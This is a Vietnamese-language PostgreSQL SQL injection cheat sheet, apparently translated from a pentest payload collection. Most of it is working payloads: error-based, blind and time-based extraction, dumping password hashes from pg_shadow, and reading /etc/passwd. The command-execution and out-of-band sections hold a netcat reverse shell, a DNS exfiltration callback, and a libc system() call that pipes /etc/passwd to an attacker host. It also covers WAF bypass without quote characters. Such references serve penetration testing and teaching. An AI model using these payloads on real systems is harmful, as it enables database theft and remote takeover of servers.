# PostgreSQL Injection

> PostgreSQL SQL injection đề cập đến một loại lỗ hổng bảo mật, trong đó kẻ tấn công khai thác dữ liệu đầu vào của người dùng không được kiểm tra, làm sạch đúng cách để thực thi các lệnh SQL trái phép trong cơ sở dữ liệu PostgreSQL.

## Tóm tắt

* [Chú thích trong PostgreSQL](#postgresql-comments)
* [Liệt kê thông tin PostgreSQL](#postgresql-enumeration)
* [Phương pháp khai thác PostgreSQL](#postgresql-methodology)
* [Khai thác dựa trên lỗi PostgreSQL](#postgresql-error-based)
    * [Các hàm hỗ trợ XML của PostgreSQL](#postgresql-xml-helpers)
* [Khai thác dạng mù (Blind) PostgreSQL](#postgresql-blind)
    * [Khai thác mù của PostgreSQL tương đương với Substring](#postgresql-blind-with-substring-equivalent)
* [Khai thác dựa trên thời gian PostgreSQL](#postgresql-time-based)
* [PostgreSQL Out of Band](#postgresql-out-of-band)
* [Truy vấn xếp chồng (Stacked Query) PostgreSQL](#postgresql-stacked-query)
* [Thao tác tập tin PostgreSQL](#postgresql-file-manipulation)
    * [Đọc tập tin PostgreSQL](#postgresql-file-read)
    * [Ghi tập tin PostgreSQL](#postgresql-file-write)
* [Thực thi lệnh trên PostgreSQL](#postgresql-command-execution)
    * [Dùng COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
    * [Dùng libc.so.6](#using-libcso6)
* [Vượt qua WAF trên PostgreSQL](#postgresql-waf-bypass)
    * [Phương án thay thế cho dấu nháy](#alternative-to-quotes)
* [Quyền hạn trong PostgreSQL](#postgresql-privileges)
    * [Liệt kê quyền hạn PostgreSQL](#postgresql-list-privileges)
    * [Vai trò Superuser trong PostgreSQL](#postgresql-superuser-role)
* [Tài liệu tham khảo](#references)

## Chú thích trong PostgreSQL

| Loại                    | Chú thích |
| ------------------------ | --------- |
| Chú thích một dòng       | `--`      |
| Chú thích nhiều dòng     | `/**/`    |

## Liệt kê thông tin PostgreSQL

| Mô tả                        | Câu truy vấn SQL                                     |
| ------------------------------ | -------------------------------------------------------- |
| Phiên bản DBMS                 | `SELECT version()`                                       |
| Tên cơ sở dữ liệu               | `SELECT CURRENT_DATABASE()`                              |
| Schema cơ sở dữ liệu            | `SELECT CURRENT_SCHEMA()`                                |
| Liệt kê người dùng PostgreSQL   | `SELECT usename FROM pg_user`                            |
| Liệt kê hash mật khẩu           | `SELECT usename, passwd FROM pg_shadow`                  |
| Liệt kê quản trị viên DB        | `SELECT usename FROM pg_user WHERE usesuper IS TRUE`     |
| Người dùng hiện tại             | `SELECT user;`                                           |
| Người dùng hiện tại             | `SELECT current_user;`                                   |
| Người dùng hiện tại             | `SELECT session_user;`                                   |
| Người dùng hiện tại             | `SELECT usename FROM pg_user;`                           |
| Người dùng hiện tại             | `SELECT getpgusername();`                                |

## Phương pháp khai thác PostgreSQL

| Mô tả                | Câu truy vấn SQL                                                                        |
| ---------------------- | ------------------------------------------------------------------------------------------ |
| Liệt kê Schema         | `SELECT DISTINCT(schemaname) FROM pg_tables`                                              |
| Liệt kê cơ sở dữ liệu  | `SELECT datname FROM pg_database`                                                          |
| Liệt kê bảng           | `SELECT table_name FROM information_schema.tables`                                        |
| Liệt kê bảng           | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'`     |
| Liệt kê bảng           | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`                       |
| Liệt kê cột            | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`        |

## Khai thác dựa trên lỗi PostgreSQL

| Tên  | Payload                                                                  |
| ---- | ----------------------------------------------------------------------- |
| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -`    |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -`                         |
| CAST | `AND (SELECT version())::int=1 -- -`                                    |

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### Các hàm hỗ trợ XML của PostgreSQL

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

Hàm `query_to_xml` ở trên trả về tất cả kết quả của câu truy vấn được chỉ định dưới dạng một kết quả duy nhất. Kết hợp kỹ thuật này với [khai thác dựa trên lỗi PostgreSQL](#postgresql-error-based) để trích xuất dữ liệu mà không cần phải lo lắng về việc giới hạn (`LIMIT`) truy vấn chỉ trả về một kết quả.

```sql
SELECT database_to_xml(true,true,''); -- dump the current database to XML
SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

Lưu ý, với các truy vấn trên, kết quả đầu ra cần được tổng hợp trong bộ nhớ. Đối với các cơ sở dữ liệu lớn hơn, điều này có thể gây ra tình trạng chậm hoặc dẫn đến từ chối dịch vụ (denial of service).

## Khai thác dạng mù (Blind) PostgreSQL

### Khai thác mù của PostgreSQL tương đương với Substring

| Hàm         | Ví dụ                                            |
| ----------- | ----------------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |

Ví dụ:

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

## Khai thác dựa trên thời gian PostgreSQL

### Nhận diện khai thác dựa trên thời gian

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

### Trích xuất cơ sở dữ liệu dựa trên thời gian

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

### Trích xuất bảng dựa trên thời gian

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

### Trích xuất cột dựa trên thời gian

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL Out of Band

Các cuộc tấn công SQL injection dạng out-of-band trong PostgreSQL dựa vào việc sử dụng các hàm có thể tương tác với hệ thống tập tin hoặc mạng, chẳng hạn như `COPY`, `lo_export`, hoặc các hàm từ các extension có thể thực hiện các hành động mạng. Ý tưởng là khai thác cơ sở dữ liệu để gửi dữ liệu đến nơi khác, mà kẻ tấn công có thể giám sát và chặn lại.

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## Truy vấn xếp chồng (Stacked Query) PostgreSQL

Dùng dấu chấm phẩy "`;`" để thêm một truy vấn khác

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## Thao tác tập tin PostgreSQL

### Đọc tập tin PostgreSQL

LƯU Ý: Các phiên bản Postgres trước đây không chấp nhận đường dẫn tuyệt đối trong `pg_read_file` hoặc `pg_ls_dir`. Các phiên bản mới hơn (kể từ commit [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)) sẽ cho phép đọc bất kỳ tập tin/đường dẫn tập tin nào đối với superuser hoặc người dùng thuộc nhóm `default_role_read_server_files`.

* Dùng `pg_read_file`, `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ```

* Dùng `COPY`

    ```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ```

* Dùng `lo_import`

    ```sql
    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
    SELECT lo_get(16420); -- use the OID returned from the above
    SELECT * from pg_largeobject; -- or just get all the large objects and their data
    ```

### Ghi tập tin PostgreSQL

* Dùng `COPY`

    ```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ```

* Dùng `COPY` (một dòng)

    ```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ```

* Dùng `lo_from_bytea`, `lo_put` và `lo_export`

    ```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
    ```

## Thực thi lệnh trên PostgreSQL

### Dùng COPY TO/FROM PROGRAM

Các bản cài đặt chạy Postgres 9.3 trở lên có chức năng cho phép superuser và người dùng có quyền '`pg_execute_server_program`' thực hiện việc pipe đến và từ một chương trình bên ngoài bằng cách dùng `COPY`.

```sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### Dùng libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## Vượt qua WAF trên PostgreSQL

### Phương án thay thế cho dấu nháy

PostgreSQL cung cấp một số cách để tạo ra các giá trị chuỗi mà không cần dùng đến ký tự chuỗi nháy đơn tiêu chuẩn. Hàm `CHR()` có thể tạo ra các ký tự riêng lẻ từ mã số của chúng, sau đó có thể được ghép lại bằng toán tử nối chuỗi (`||`). PostgreSQL cũng hỗ trợ chuỗi được đánh dấu bằng ký hiệu đô la (dollar-quoted string), có từ phiên bản 8, cho phép văn bản được đặt giữa các dấu phân cách `$$` mà không cần escape các dấu nháy đơn bên trong.

| Payload                                 | Kỹ thuật                                          |
| --------------------------------------- | ---------------------------------------------------- |
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | Chuỗi từ `CHR()`                                     |
| `SELECT $$NoQuote$$`                    | Chuỗi đánh dấu bằng ký hiệu đô la (từ PostgreSQL >= 8) |

## Quyền hạn trong PostgreSQL

### Liệt kê quyền hạn PostgreSQL

Lấy tất cả các quyền cấp bảng của người dùng hiện tại, loại trừ các bảng nằm trong các schema hệ thống như `pg_catalog` và `information_schema`.

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### Vai trò Superuser trong PostgreSQL

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## Tài liệu tham khảo

* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://web.archive.org/web/20250812102408/https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://web.archive.org/web/20200927000909/https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://web.archive.org/web/20250803101126/https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](https://web.archive.org/web/20260302153609/https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://web.archive.org/web/20201001043242/https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://web.archive.org/web/20240613225549/https://hackerone.com/reports/181803)
* [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://web.archive.org/web/20251210040037/https://pulsesecurity.co.nz/articles/postgres-sqli)
